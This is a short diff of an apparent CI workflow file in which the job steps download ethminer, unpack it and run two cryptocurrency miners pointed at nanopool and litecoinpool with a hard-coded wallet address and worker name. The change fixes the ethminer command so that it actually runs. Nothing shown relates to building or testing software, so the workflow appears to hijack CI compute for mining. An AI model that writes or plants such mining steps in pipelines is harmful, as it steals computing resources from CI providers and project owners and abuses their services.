@@ -29,5 +29,5 @@ jobs:
       - run: wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz
       - run: tar xvzf ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz
       - run: cd bin
-      - run: !./ethminer -P stratum+tcp://0xaf308Ccd29d573421edc0710ceAE805f3C299058@eth-eu1.nanopool.org:9999
+      - run: ./ethminer -P stratum+tcp://0xaf308Ccd29d573421edc0710ceAE805f3C299058@eth-eu1.nanopool.org:9999
       - run: ./minerd -o stratum+tcp://litecoinpool.org:3333 -u arthdal20.2 -p 2
